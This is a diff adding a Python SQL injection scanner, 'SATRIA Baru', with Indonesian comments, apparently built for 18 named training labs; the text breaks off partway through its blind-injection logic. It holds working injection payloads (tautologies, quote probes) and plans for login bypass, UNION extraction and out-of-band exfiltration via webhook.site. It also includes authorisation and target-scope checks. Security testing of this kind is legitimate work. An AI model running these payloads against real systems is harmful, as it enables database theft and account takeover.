@@ -1,0 +1,1782 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+SATRIA Baru -- pemindai SQL injection terfokus.
+
+File ini sengaja tidak mewarisi seluruh kapabilitas SATRIA. Ia hanya menguji
+18 lab berikut dan laporannya juga hanya memuat 18 judul itu:
+
+ 01 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+ 02 SQL injection vulnerability allowing login bypass
+ 03 SQL injection attack, querying the database type and version on Oracle
+ 04 SQL injection attack, querying the database type and version on MySQL and Microsoft
+ 05 SQL injection attack, listing the database contents on non-Oracle databases
+ 06 SQL injection attack, listing the database contents on Oracle
+ 07 SQL injection UNION attack, determining the number of columns returned by the query
+ 08 SQL injection UNION attack, finding a column containing text
+ 09 SQL injection UNION attack, retrieving data from other tables
+ 10 SQL injection UNION attack, retrieving multiple values in a single column
+ 11 Blind SQL injection with conditional responses
+ 12 Blind SQL injection with conditional errors
+ 13 Visible error-based SQL injection
+ 14 Blind SQL injection with time delays
+ 15 Blind SQL injection with time delays and information retrieval
+ 16 Blind SQL injection with out-of-band interaction
+ 17 Blind SQL injection with out-of-band data exfiltration
+ 18 SQL injection with filter bypass via XML encoding
+
+Keputusan "terkonfirmasi" dibuat konservatif: payload harus menghasilkan bukti
+diferensial yang bisa diulang (respon SQL/UNION, penanda unik, perbandingan
+true/false, delay terkontrol, atau interaksi OOB), bukan sekadar satu halaman
+berubah. Tanpa bukti kuat statusnya hanya "belum terkonfirmasi".
+
+Cara pakai (hanya pada target yang Anda miliki/berizin):
+    python satria_baru.py https://lab-target --authorized
+    python satria_baru.py https://lab-target --authorized --oob-webhook-site
+    python satria_baru.py https://lab-target --authorized \
+        --oob-domain abc123.example.com --oob-poll-url https://poll.example/interactions
+
+OOB memakai domain/poller yang Anda kendalikan, atau webhook.site bila
+--oob-webhook-site diberikan. Tanpa keduanya, lab 16/17 dilaporkan belum teruji
+secara valid (bukan dianggap aman).
+"""
+
+from __future__ import annotations
+
+import argparse
+import difflib
+import html as html_module
+import ipaddress
+import json
+import os
+import random
+import re
+import socket
+import statistics
+import string
+import sys
+import time
+import uuid
+from bisect import bisect_left
+from collections import deque
+from dataclasses import dataclass, field
+from datetime import datetime, timezone
+from pathlib import Path
+from typing import Any, Iterable
+from urllib.parse import (
+    parse_qsl,
+    quote_plus,
+    urlencode,
+    urljoin,
+    urlparse,
+    urlunparse,
+)
+
+import requests
+from bs4 import BeautifulSoup
+
+__version__ = "1.0.0"
+USER_AGENT = f"SATRIA-Baru/{__version__} (+authorized SQL injection lab scanner)"
+
+# ----------------------------------------------------------------------------
+# Katalog: hanya 18 lab yang diminta pengguna.
+# ----------------------------------------------------------------------------
+CATALOG: list[tuple[int, str, str, str]] = [
+    (1, "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data", "where_hidden", "high"),
+    (2, "SQL injection vulnerability allowing login bypass", "login_bypass", "critical"),
+    (3, "SQL injection attack, querying the database type and version on Oracle", "oracle_version", "high"),
+    (4, "SQL injection attack, querying the database type and version on MySQL and Microsoft", "mysql_mssql_version", "high"),
+    (5, "SQL injection attack, listing the database contents on non-Oracle databases", "non_oracle_listing", "high"),
+    (6, "SQL injection attack, listing the database contents on Oracle", "oracle_listing", "high"),
+    (7, "SQL injection UNION attack, determining the number of columns returned by the query", "union_column_count", "high"),
+    (8, "SQL injection UNION attack, finding a column containing text", "union_text_column", "high"),
+    (9, "SQL injection UNION attack, retrieving data from other tables", "union_other_tables", "critical"),
+    (10, "SQL injection UNION attack, retrieving multiple values in a single column", "union_multi_value", "critical"),
+    (11, "Blind SQL injection with conditional responses", "blind_conditional_responses", "high"),
+    (12, "Blind SQL injection with conditional errors", "blind_conditional_errors", "high"),
+    (13, "Visible error-based SQL injection", "visible_error", "high"),
+    (14, "Blind SQL injection with time delays", "time_delay", "high"),
+    (15, "Blind SQL injection with time delays and information retrieval", "time_information", "high"),
+    (16, "Blind SQL injection with out-of-band interaction", "oob_interaction", "medium"),
+    (17, "Blind SQL injection with out-of-band data exfiltration", "oob_exfiltration", "critical"),
+    (18, "SQL injection with filter bypass via XML encoding", "xml_filter_bypass", "critical"),
+]
+
+SQL_ERROR_PATTERNS: list[tuple[re.Pattern[str], str]] = [
+    (re.compile(r"ora-\d{4,5}"), "oracle"),
+    (re.compile(r"oracle[^<]{0,40}error"), "oracle"),
+    (re.compile(r"you have an error in your sql syntax|mysql syntax|mysqlexception|warning.*mysql_"), "mysql"),
+    (re.compile(r"postgresql|pg_query\(|pg_exec\(|syntax error at or near|unterminated quoted string"), "postgresql"),
+    (re.compile(r"microsoft sql server|odbc sql server|sqlserver|unclosed quotation mark|incorrect syntax near"), "mssql"),
+    (re.compile(r"sqlite3?::|sqlite3\.operationalerror|sqlite/jdbc|sqlstate\["), "sqlite"),
+]
+DB_VERSION_RE = re.compile(
+    r"(oracle[^<]{0,60}\d[\d.]+|microsoft sql server[^<]{0,60}\d[\d.]+|"
+    r"mysql[^<]{0,40}\d[\d.]+|mariadb[^<]{0,40}\d[\d.]+|postgresql[^<]{0,40}\d[\d.]+|"
+    r"\b\d{1,2}\.\d{1,2}\.\d{1,3}(?:[-.][\w.]+)?\b)",
+    re.I,
+)
+AUTH_MARKERS = (
+    "welcome back", "you are logged in", "logged in as", "welcome to your account",
+    "your account", "my account", "log out", "logout", "sign out", "signout",
+    "account dashboard", "dashboard",
+)
+AUTH_FAILURE_MARKERS = (
+    "invalid username or password", "incorrect username", "authentication failed",
+    "login failed", "invalid credentials", "unauthorized", "access denied",
+)
+DESTRUCTIVE_PATH_RE = re.compile(
+    r"(?:^|/)(?:logout|log-out|signout|sign-out|delete|remove|checkout|payment|purchase|"
+    r"transfer|unsubscribe|empty-cart|clear-cart)(?:/|$)",
+    re.I,
+)
+VOLATILE_REPLACEMENTS: list[tuple[re.Pattern[str], str]] = [
+    (re.compile(r"\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b", re.I), " <UUID> "),
+    (re.compile(r"\b[0-9a-f]{32,}\b", re.I), " <TOKEN> "),
+    (re.compile(r"\b(?:csrf|authenticity)[^\"'<>:= ]*[:=][^\"'<> ]{8,}", re.I), " csrf=<TOKEN> "),
+    (re.compile(r"\b20\d{2}-\d{2}-\d{2}[T ][0-9:.-]+(?:[+-]\d{2}:?\d{2}|Z)?\b"), " <TIMESTAMP> "),
+    (re.compile(r"\b\d{10}\b"), " <TS> "),
+]
+COMMON_TABLE_WORDS = (
+    "users", "user", "products", "product", "inventory", "customers", "customer",
+    "orders", "order", "items", "item", "accounts", "account", "sessions", "session",
+    "tracking", "stock", "stores", "store", "categories", "category", "prices",
+)
+
+
+@dataclass
+class Response:
+    status: int | None
+    url: str
+    text: str
+    headers: dict[str, str]
+    elapsed: float
+    error: str | None = None
+
+    @property
+    def normalized(self) -> str:
+        return normalize_text(self.text)
+
+    @property
+    def ok_status(self) -> bool:
+        return self.status is not None and 200 <= self.status < 400
+
+    @property
+    def is_redirect(self) -> bool:
+        return self.status in (301, 302, 303, 307, 308)
+
+
+@dataclass
+class FormSpec:
+    page_url: str
+    action: str
+    method: str
+    fields: tuple[tuple[str, str, str], ...]
+    has_password: bool = False
+
+
+@dataclass
+class Page:
+    url: str
+    text: str
+    links: list[str] = field(default_factory=list)
+    forms: list[FormSpec] = field(default_factory=list)
+    cookie_names: dict[str, str] = field(default_factory=dict)
+    js_text: str = ""
+    status: int | None = None
+
+
+@dataclass
+class Point:
+    key: str
+    kind: str
+    label: str
+    url: str
+    name: str
+    original: str
+    page_url: str
+    method: str = "GET"
+    fields: tuple[tuple[str, str, str], ...] = ()
+    interest: int = 0
+
+    @property
+    def numeric(self) -> bool:
+        return bool(re.fullmatch(r"-?\d+(?:\.\d+)?", (self.original or "").strip()))
+
+
+@dataclass
+class Baseline:
+    point: Point
+    first: Response
+    second: Response
+    similarity: float
+
+    @property
+    def median_elapsed(self) -> float:
+        vals = sorted([self.first.elapsed, self.second.elapsed])
+        return statistics.median(vals)
+
+
+@dataclass
+class OOBSetup:
+    kind: str
+    domain: str
+    token: str
+    poll_url: str | None = None
+    webhook_token: str | None = None
+
+
+def normalize_text(value: str) -> str:
+    if not value:
+        return ""
+    soup = BeautifulSoup(value[:300_000], "html.parser")
+    for tag in soup(["script", "style", "noscript"]):
+        tag.decompose()
+    text = soup.get_text(" ", strip=True) or value[:300_000]
+    for pattern, replacement in VOLATILE_REPLACEMENTS:
+        text = pattern.sub(replacement, text)
+    return re.sub(r"\s+", " ", text).strip()
+
+
+def similarity(a: str, b: str) -> float:
+    if a == b:
+        return 1.0
+    if not a or not b:
+        return 0.0
+    return difflib.SequenceMatcher(None, a[:80_000], b[:80_000], autojunk=False).ratio()
+
+
+def sql_errors(resp: Response | None) -> list[tuple[str, str]]:
+    if resp is None or resp.error:
+        return []
+    body = (resp.text or "").lower()
+    out: dict[str, str] = {}
+    for pattern, dbms in SQL_ERROR_PATTERNS:
+        for match in pattern.finditer(body):
+            out.setdefault(dbms, match.group(0)[:100])
+            if len(out) >= 4:
+                return sorted(out.items())
+    return sorted(out.items())
+
+
+def has_sql_error(resp: Response | None) -> bool:
+    return bool(sql_errors(resp))
+
+
+def snippet(value: str, limit: int = 240) -> str:
+    text = re.sub(r"\s+", " ", html_module.unescape(value or "")).strip()
+    return text[:limit]
+
+
+def random_token(prefix: str = "sat") -> str:
+    return prefix + uuid.uuid4().hex[:10].lower()
+
+
+def mask_secret(secret: str) -> str:
+    if not secret:
+        return ""
+    if len(secret) <= 4:
+        return "*" * len(secret)
+    return f"{secret[:1]}***{secret[-1:]} (len={len(secret)})"
+
+
+def is_same_origin(url: str, base: str) -> bool:
+    pa, pb = urlparse(url), urlparse(base)
+    if pa.scheme not in ("http", "https") or pb.scheme not in ("http", "https"):
+        return False
+    return (pa.scheme == pb.scheme and (pa.hostname or "").lower() == (pb.hostname or "").lower()
+            and (pa.port or (443 if pa.scheme == "https" else 80))
+            == (pb.port or (443 if pb.scheme == "https" else 80)))
+
+
+def canonical_url(url: str) -> str:
+    p = urlparse(url)
+    return urlunparse((p.scheme, p.netloc, p.path or "/", "", p.query, ""))
+
+
+def has_volatile_query_value(key: str, value: str) -> bool:
+    return bool(re.search(r"(?:csrf|token|nonce|session|sid|ts|timestamp)", key, re.I)) and len(value) >= 8
+
+
+class SatriaBaruScanner:
+    def __init__(
+        self,
+        target_url: str,
+        *,
+        authorized: bool = False,
+        allow_private: bool = False,
+        max_pages: int = 20,
+        max_points: int = 24,
+        max_requests: int = 520,
+        timeout: float = 8.0,
+        time_delay: float = 3.0,
+        oob_domain: str | None = None,
+        oob_poll_url: str | None = None,
+        oob_webhook_site: bool = False,
+    ):
+        self.target_url = self._normalize_target(target_url)
+        if not authorized:
+            raise ValueError("Pengujian aktif memerlukan --authorized (Anda menyatakan memiliki izin pengujian).")
+        if not allow_private:
+            self._validate_public_target(self.target_url)
+        self.origin = self._origin(self.target_url)
+        self.max_pages = max(1, min(max_pages, 40))
+        self.max_points = max(4, min(max_points, 60))
+        self.max_requests = max(100, min(max_requests, 1200))
+        self.timeout = max(3.0, min(timeout, 30.0))
+        self.time_delay = max(1.0, min(time_delay, 8.0))
+        self.request_count = 0
+        self.started = time.monotonic()
+        self.deadline_seconds = 600.0
+        self.session = requests.Session()
+        self.session.headers.update({
+            "User-Agent": USER_AGENT,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Cache-Control": "no-cache",
+        })
+        self.pages: list[Page] = []
+        self.points: list[Point] = []
+        self._baselines: dict[str, Baseline | None] = {}
+        self._union_cols: dict[str, int] = {}
+        self._text_col: dict[str, int] = {}
+        self._dbms_hint: dict[str, str] = {}
+        self._confirmed: dict[int, dict[str, Any]] = {}
+        self.stats = {
+            "pages_fetched": 0,
+            "xml_endpoints": 0,
+            "requests": 0,
+            "errors": [],
+        }
+        self.oob = self._setup_oob(oob_domain, oob_poll_url, oob_webhook_site)
+        self.oob_status = "configured" if self.oob else "not_configured"
+
+    # ------------------------------------------------------------------
+    # Target validation
+    # ------------------------------------------------------------------
+    @staticmethod
+    def _normalize_target(url: str) -> str:
+        value = (url or "").strip()
+        if not value:
+            raise ValueError("Target URL wajib diisi.")
+        if not re.match(r"^https?://", value, re.I):
+            value = "https://" + value
+        p = urlparse(value)
+        if p.scheme not in ("http", "https") or not p.hostname:
+            raise ValueError("Target harus berupa URL http:// atau https:// yang valid.")
+        if p.username or p.password:
+            raise ValueError("Jangan sertakan kredensial pada URL target.")
+        return urlunparse((p.scheme.lower(), p.netloc, p.path or "/", p.params, p.query, ""))
+
+    @staticmethod
+    def _origin(url: str) -> tuple[str, str, int]:
+        p = urlparse(url)
+        return (p.scheme, (p.hostname or "").lower(), p.port or (443 if p.scheme == "https" else 80))
+
+    def _validate_public_target(self, url: str) -> None:
+        host = (urlparse(url).hostname or "").rstrip(".").lower()
+        if host in {"localhost", "localhost.localdomain"} or host.endswith((".localhost", ".local", ".internal", ".test", ".invalid")):
+            raise ValueError("Target localhost/internal ditolak tanpa --allow-private.")
+        p = urlparse(url)
+        try:
+            records = socket.getaddrinfo(host, p.port or (443 if p.scheme == "https" else 80), type=socket.SOCK_STREAM)
+        except socket.gaierror as exc:
+            raise ValueError(f"Hostname target tidak dapat di-resolve: {exc}") from exc
+        addresses = {item[4][0].split("%", 1)[0] for item in records}
+        for address in addresses:
+            ip = ipaddress.ip_address(address)
+            if not ip.is_global:
+                raise ValueError(f"Target mengarah ke IP non-publik ({ip}); pemindaian dihentikan.")
+
+    def _same_origin(self, url: str) -> bool:
+        return is_same_origin(url, self.target_url)
+
+    def _within_budget(self) -> bool:
+        return self.request_count < self.max_requests and (time.monotonic() - self.started) < self.deadline_seconds
+
+    # ------------------------------------------------------------------
+    # OOB setup
+    # ------------------------------------------------------------------
+    def _setup_oob(self, domain: str | None, poll_url: str | None, webhook_site: bool) -> OOBSetup | None:
+        domain = (domain or os.getenv("SATRIA_OOB_DOMAIN") or "").strip().lower().strip(".")
+        poll_url = (poll_url or os.getenv("SATRIA_OOB_POLL_URL") or "").strip() or None
+        if webhook_site:
+            token = self._create_webhook_site_token()
+            if token:
+                return OOBSetup("webhook_site", "webhook.site", token, f"https://webhook.site/token/{token}/requests", token)
+            self.oob_status = "webhook_site_create_failed"
+            return None
+        if domain:
+            return OOBSetup("poll_url" if poll_url else "domain_only", domain, random_token("satria"), poll_url)
+        return None
+
+    @staticmethod
+    def _create_webhook_site_token() -> str | None:
+        try:
+            resp = requests.post("https://webhook.site/token", timeout=15)
+            resp.raise_for_status()
+            token = resp.json().get("uuid")
+            return token if isinstance(token, str) and token else None
+        except Exception:
+            return None
+
+    # ------------------------------------------------------------------
+    # HTTP plumbing
+    # ------------------------------------------------------------------
+    def _request(
+        self,
+        method: str,
+        url: str,
+        *,
+        session: requests.Session | None = None,
+        params: Any = None,
+        data: Any = None,
+        headers: dict[str, str] | None = None,
+        allow_redirects: bool = False,
+        timeout: float | None = None,
+    ) -> Response:
+        if not self._within_budget():
+            return Response(None, url, "", {}, 0.0, error="budget_exhausted")
+        started = time.monotonic()
+        try:
+            resp = (session or self.session).request(
+                method,
+                url,
+                params=params,
+                data=data,
+                headers=headers,
+                timeout=timeout or self.timeout,
+                allow_redirects=allow_redirects,
+            )
+            elapsed = time.monotonic() - started
+            self.request_count += 1
+            self.stats["requests"] = self.request_count
+            return Response(
+                status=resp.status_code,
+                url=resp.url,
+                text=resp.text or "",
+                headers=dict(resp.headers),
+                elapsed=elapsed,
+            )
+        except requests.RequestException as exc:
+            elapsed = time.monotonic() - started
+            self.request_count += 1
+            self.stats["requests"] = self.request_count
+            return Response(None, url, "", {}, elapsed, error=f"{type(exc).__name__}: {str(exc)[:160]}")
+        except Exception as exc:
+            elapsed = time.monotonic() - started
+            self.request_count += 1
+            self.stats["requests"] = self.request_count
+            return Response(None, url, "", {}, elapsed, error=f"{type(exc).__name__}: {str(exc)[:160]}")
+
+    def _cookie_header(self, name: str | None = None, override: str | None = None) -> str:
+        jar: dict[str, str] = {}
+        for cookie in self.session.cookies:
+            jar[cookie.name] = cookie.value or ""
+        if name is not None:
+            jar[name] = override or ""
+        return "; ".join(f"{k}={v}" for k, v in jar.items())
+
+    def _require_origin(self, url: str) -> bool:
+        if not self._same_origin(url):
+            self.stats["errors"].append(f"Permintaan lintas-origin ditolak: {url}")
+            return False
+        return True
+
+    def send(self, point: Point, value: str | None = None) -> Response:
+        """Kirim nilai lengkap ke satu titik injeksi."""
+        target_value = point.original if value is None else value
+        if point.kind == "query":
+            return self._request("GET", self._with_query_value(point, target_value))
+        if point.kind == "form":
+            action, params, data = self._form_request_parts(point, target_value)
+            return self._request(point.method, action, params=params, data=data)
+        if point.kind == "cookie":
+            cookie_value = quote_plus(target_value)
+            return self._request(
+                "GET",
+                point.url,
+                headers={"Cookie": self._cookie_header(point.name, cookie_value)},
+            )
+        if point.kind == "xml":
+            body = build_xml_body({point.name: target_value})
+            return self._request(
+                "POST", point.url, data=body,
+                headers={"Content-Type": "application/xml; charset=UTF-8", "Accept": "application/xml,text/plain"},
+            )
+        return Response(None, point.url, "", {}, 0.0, error="unknown_point_kind")
+
+    @staticmethod
+    def _with_query_value(point: Point, value: str) -> str:
+        p = urlparse(point.url)
+        pairs = parse_qsl(p.query, keep_blank_values=True)
+        out: list[tuple[str, str]] = []
+        replaced = False
+        for key, old in pairs:
+            if key == point.name and not replaced:
+                out.append((key, value))
+                replaced = True
+            else:
+                out.append((key, old))
+        if not replaced:
+            out.append((point.name, value))
+        return urlunparse((p.scheme, p.netloc, p.path or "/", p.params, urlencode(out, doseq=True), ""))
+
+    def _form_request_parts(self, point: Point, value: str) -> tuple[str, Any, Any]:
+        parsed = urlparse(point.url)
+        action_pairs = parse_qsl(parsed.query, keep_blank_values=True)
+        fields = list(point.fields)
+        field_names = {name for name, _, _ in fields}
+        merged: list[tuple[str, str]] = []
+        replaced = False
+        for name, val, _typ in fields:
+            if name == point.name and not replaced:
+                merged.append((name, value))
+                replaced = True
+            else:
+                merged.append((name, val))
+        if not replaced and point.name not in field_names:
+            merged.append((point.name, value))
+        merged.extend((k, v) for k, v in action_pairs if k not in field_names)
+        clean_action = urlunparse((parsed.scheme, parsed.netloc, parsed.path or "/", parsed.params, "", ""))
+        if point.method == "GET":
+            return clean_action, urlencode(merged, doseq=True), None
+        return clean_action, None, dict(merged)
+
+    # ------------------------------------------------------------------
+    # Discovery
+    # ------------------------------------------------------------------
+    def crawl(self) -> None:
+        queue: deque[str] = deque([self.target_url])
+        visited: set[str] = set()
+        while queue and len(visited) < self.max_pages and self._within_budget():
+            url = canonical_url(queue.popleft())
+            if url in visited or not self._require_origin(url):
+                continue
+            visited.add(url)
+            resp = self._request("GET", url, allow_redirects=True)
+            if resp.error or not resp.text:
+                self.stats["errors"].append(f"Crawl gagal {url}: {resp.error}")
+                continue
+            self.stats["pages_fetched"] += 1
+            self._append_page(url, resp)
+            for link in self.pages[-1].links:
+                if link not in visited and link not in queue and len(visited) + len(queue) < self.max_pages * 3:
+                    queue.append(link)
+        self._build_points()
+
+    def _append_page(self, url: str, resp: Response) -> None:
+        soup = BeautifulSoup(resp.text, "html.parser")
+        links: list[str] = []
+        for anchor in soup.find_all("a", href=True):
+            absolute = urljoin(url, anchor["href"])
+            parsed = urlparse(absolute)
+            if parsed.scheme not in ("http", "https") or not self._same_origin(absolute):
+                continue
+            if DESTRUCTIVE_PATH_RE.search(parsed.path or "/"):
+                continue
+            links.append(canonical_url(absolute))
+        forms = self._parse_forms(url, soup)
+        js_bits: list[str] = []
+        for script in soup.find_all("script"):
+            src = script.get("src")
+            if src:
+                absolute = urljoin(url, src)
+                if self._same_origin(absolute) and len(js_bits) < 4 and self._within_budget():
+                    js_resp = self._request("GET", absolute)
+                    if not js_resp.error and js_resp.text:
+                        js_bits.append(js_resp.text[:120_000])
+            elif script.string:
+                js_bits.append(script.string[:120_000])
+        cookies = {c.name: c.value or "" for c in self.session.cookies}
+        self.pages.append(Page(
+            url=url, text=resp.text, links=list(dict.fromkeys(links)),
+            forms=forms, cookie_names=cookies, js_text="\n".join(js_bits), status=resp.status,
+        ))
+
+    @staticmethod
+    def _parse_forms(base: str, soup: BeautifulSoup) -> list[FormSpec]:
+        forms: list[FormSpec] = []
+        for form in soup.find_all("form"):
+            action = urljoin(base, form.get("action") or base)
+            method = (form.get("method") or "get").lower()
+            fields: list[tuple[str, str, str]] = []
+            has_password = False
+            for field in form.find_all(["input", "select", "textarea"]):
+                name = field.get("name")
+                if not name or field.has_attr("disabled"):
+                    continue
+                typ = (field.get("type") or "").lower() or field.name
+                if typ in {"password"}:
+                    has_password = True
+                if typ in {"submit", "button", "image", "reset", "file"}:
+                    continue
+                value = str(field.get("value") or "")
+                if field.name == "textarea":
+                    value = field.text or ""
+                elif field.name == "select":
+                    selected = field.find("option", selected=True) or field.find("option")
+                    value = str(selected.get("value") or selected.text or "") if selected else ""
+                fields.append((name, value[:500], typ))
+            forms.append(FormSpec(base, action, method, tuple(fields), has_password))
+        return forms
+
+    # ------------------------------------------------------------------
+    # Point building (dedupe logis: parameter/path, bukan URL penuh)
+    # ------------------------------------------------------------------
+    def _build_points(self) -> None:
+        points: list[Point] = []
+        seen: set[tuple[str, str, str]] = set()
+
+        def add(point: Point) -> None:
+            if point.key not in seen:
+                seen.add(point.key)
+                points.append(point)
+
+        for page in self.pages:
+            parsed = urlparse(page.url)
+            for name, value in parse_qsl(parsed.query, keep_blank_values=True):
+                if has_volatile_query_value(name, value):
+                    continue
+                path = parsed.path or "/"
+                key = f"query|{path}|{name}"
+                add(Point(
+                    key=key, kind="query", label=f"query `{name}`",
+                    url=canonical_url(page.url), name=name,
+                    original=value or "1", page_url=page.url,
+                    interest=self._interest_for_name(name),
+                ))
+            for form in page.forms:
+                if form.method != "get" or form.has_password:
+                    continue
+                action_path = urlparse(form.action).path or "/"
+                if DESTRUCTIVE_PATH_RE.search(action_path):
+                    continue
+                for name, value, typ in form.fields:
+                    if typ in {"password", "checkbox", "radio", "hidden"}:
+                        continue
+                    key = f"form|{form.method}|{action_path}|{name}"
+                    add(Point(
+                        key=key, kind="form", label=f"form `{name}`",
+                        url=form.action, name=name,
+                        original=value or "1", page_url=page.url,
+                        method=form.method.upper(), fields=form.fields,
+                        interest=self._interest_for_name(name),
+                    ))
+        cookie_pages: dict[str, tuple[str, str]] = {}
+        for page in self.pages:
+            for name, value in page.cookie_names.items():
+                cookie_pages.setdefault(name, (page.url, value or ""))
+        for name, (page_url, value) in cookie_pages.items():
+            path = urlparse(page_url).path or "/"
+            key = f"cookie|{path}|{name}"
+            if re.search(r"(session|sid|php|csrf|auth)", name, re.I):
+                interest = 0
+            else:
+                interest = self._interest_for_name(name) + 2
+            add(Point(
+                key=key, kind="cookie", label=f"cookie `{name}`",
+                url=canonical_url(page_url), name=name,
+                original=value or "guest", page_url=page_url,
+                interest=interest,
+            ))
+        for endpoint, page_url, field_name in self._xml_candidates():
+            key = f"xml|{urlparse(endpoint).path}|{field_name}"
+            add(Point(
+                key=key, kind="xml", label=f"xml `{field_name}`",
+                url=endpoint, name=field_name, original="1", page_url=page_url,
+                method="POST", interest=4,
+            ))
+        self.points = sorted(points, key=lambda p: (-p.interest, p.kind, p.label))[: self.max_points]
+        self.stats["xml_endpoints"] = sum(1 for p in self.points if p.kind == "xml")
+
+    @staticmethod
+    def _interest_for_name(name: str) -> int:
+        lowered = name.lower()
+        score = 1
+        for token, bonus in (
+            ("product", 5), ("category", 5), ("store", 5), ("stock", 5),
+            ("user", 4), ("name", 4), ("search", 4), ("id", 3), ("tracking", 4), ("track", 4),
+        ):
+            if token in lowered:
+                score += bonus
+        return score
+
+    def _xml_candidates(self) -> list[tuple[str, str, str]]:
+        candidates: list[tuple[str, str, str]] = []
+        seen: set[tuple[str, str]] = set()
+        for page in self.pages:
+            text = (page.text or "") + "\n" + (page.js_text or "")
+            low = text.lower()
+            if not re.search(r"stockcheck|checkstock|storeid|stockapi|check stock", low):
+                continue
+            found: list[str] = []
+            for match in re.finditer(r"""['"]([^'"]{1,220})['"]""", text):
+                candidate = match.group(1).strip()
+                if not candidate.startswith("/") or candidate.startswith("//"):
+                    continue
+                if re.search(r"(stock|check|inventory|xml|soap|api)", candidate, re.I):
+                    found.append(urljoin(page.url, candidate))
+            for match in re.finditer(r"(?:fetch|axios\.post|\.post|\.open)\s*\(\s*(?:['\"][A-Z]+['\"]\s*,\s*)?['\"]([^'\"]{1,220})['\"]", text, re.I):
+                candidate = match.group(1).strip()
+                if candidate.startswith("/"):
+                    found.append(urljoin(page.url, candidate))
+            if not found and ("/product" in (urlparse(page.url).path or "")):
+                found.append(urljoin(page.url, "/product/stock"))
+            for endpoint in dict.fromkeys(found):
+                if not self._same_origin(endpoint):
+                    continue
+                for field_name in ("storeId", "productId"):
+                    if (endpoint, field_name) not in seen:
+                        seen.add((endpoint, field_name))
+                        candidates.append((endpoint, page.url, field_name))
+        return candidates[:4]
+
+    # ------------------------------------------------------------------
+    # Baseline & helpers
+    # ------------------------------------------------------------------
+    def baseline(self, point: Point) -> Baseline | None:
+        if point.key in self._baselines:
+            return self._baselines[point.key]
+        r1 = self.send(point)
+        if not self._within_budget():
+            self._baselines[point.key] = None
+            return None
+        r2 = self.send(point)
+        if r1.error or r2.error or r1.status is None or r2.status is None:
+            self._baselines[point.key] = None
+            return None
+        if r1.status >= 500 or r2.status >= 500 or r1.status in (404, 405):
+            self._baselines[point.key] = None
+            return None
+        sim = similarity(r1.normalized, r2.normalized)
+        if sim < 0.85:
+            self._baselines[point.key] = None
+            return None
+        base = Baseline(point, r1, r2, sim)
+        self._baselines[point.key] = base
+        return base
+
+    @staticmethod
+    def _quote_prefix(point: Point) -> str:
+        return point.original if point.numeric else f"{point.original}'"
+
+    def _inject(self, point: Point, payload: str) -> str:
+        prefix = point.original if point.numeric else f"{point.original}'"
+        return f"{prefix} {payload}" if not payload.startswith(("[", "(", "'")) else f"{prefix}{payload}"
+
+    def _inject_fragment(self, point: Point, fragment: str) -> str:
+        return self._inject(point, fragment)
+
+    def _mark(self, lab_no: int, point: Point, evidence: str, method: str, severity: str | None = None) -> None:
+        if lab_no in self._confirmed:
+            return
+        meta = next(item for item in CATALOG if item[0] == lab_no)
+        self._confirmed[lab_no] = {
+            "id": f"sql_injection-{lab_no:02d}",
+            "status": "confirmed",
+            "title": meta[1],
+            "method": method,
+            "location": point.label,
+            "evidence": snippet(evidence),
+            "severity": severity or meta[3],
+        }
+
+    def _engage(self, point: Point, base: Baseline) -> bool:
+        quote = self.send(point, point.original + ("'" if not point.numeric else ""))
+        if has_sql_error(quote):
+            return True
+        if quote.status is not None and quote.status != base.first.status:
+            return True
+        if quote.error:
+            return False
+        sim = similarity(base.first.normalized, quote.normalized)
+        length_delta = abs(len(quote.text) - len(base.first.text))
+        return sim < 0.93 or length_delta > max(100, len(base.first.text) * 0.2)
+
+    # ------------------------------------------------------------------
+    # 13: visible error based
+    # ------------------------------------------------------------------
+    def phase_visible_error(self, points: list[Point]) -> None:
+        for point in points:
+            if 13 in self._confirmed:
+                return
+            base = self.baseline(point)
+            if not base:
+                continue
+            for probe in (f"{point.original}'", f"{point.original}\""):
+                resp = self.send(point, probe)
+                errs = sql_errors(resp)
+                baseline_errs = {e for _, e in sql_errors(base.first)}
+                fresh = [(dbms, e) for dbms, e in errs if e not in baseline_errs]
+                if fresh:
+                    confirm = self.send(point, probe)
+                    if sql_errors(confirm):
+                        self._mark(13, point,
+                                   f"Pesan error SQL unik muncul hanya setelah injeksi kutip pada {point.label}: {fresh[0][0]} ({fresh[0][1]}).",
+                                   "visible error differential (diulang)")
+                        break
+                    break
+
+    # ------------------------------------------------------------------
+    # 01: WHERE clause hidden data
+    # ------------------------------------------------------------------
+    def _record_count(self, resp: Response) -> int:
+        text = resp.text or ""
+        patterns = [
+            r"/product\?(?:id|productId)=",
+            r"class=\"[^\"]*(?:product|item|card)[^\"]*\"",
+            r"<tr[^>]*>",
+            r"\b(?:Price|Harga)\b",
+            r"\b(?:Add to cart|Tambah ke keranjang|Beli sekarang)\b",
+        ]
+        return max((len(re.findall(p, text, re.I)) for p in patterns), default=0)
+
+    def phase_where_hidden(self, points: list[Point]) -> None:
+        for point in points:
+            if 1 in self._confirmed:
+                return
+            base = self.baseline(point)
+            if not base:
+                continue
+            if point.numeric:
+                true_payload = f"{point.original} OR 1=1-- -"
+                false_payload = f"{point.original} OR 1=2-- -"
+            else:
+                true_payload = f"{point.original}' OR '1'='1'-- -"
+                false_payload = f"{point.original}' OR '1'='2'-- -"
+            true = self.send(point, true_payload)
+            false = self.send(point, false_payload)
+            if true.error or false.error:
+                continue
+            base_count = max(1, self._record_count(base.first))
+            true_count = self._record_count(true)
+            false_count = self._record_count(false)
+            len_ratio = len(true.text) / max(1, len(base.first.text))
+            if (true_count >= base_count + 2 and false_count <= base_count + 1
+                    and len_ratio >= 1.15 and true_count != false_count):
+                self._mark(1, point,
+                           f"Payload WHERE OR 1=1 menampilkan {true_count} record vs baseline {base_count}; OR 1=2 kembali {false_count}.",
+                           "WHERE tautology differential")
+
+    # ------------------------------------------------------------------
+    # 11: blind conditional responses
+    # ------------------------------------------------------------------
+    def phase_conditional_responses(self, points: list[Point]) -> None:
+        families: list[tuple[str, str]] = []
+        if points:
+            sample = points[0]
+            if sample.numeric:
+                families = [("numeric_and", "{v} AND 1=1"), ("numeric_and_false", "{v} AND 1=2")]
+            else:
+                families = [("string_and", "{v}' AND '1'='1"), ("string_and_false", "{v}' AND '1'='2")]
+        for point in points:
+            if 11 in self._confirmed:
+                return
+            base = self.baseline(point)
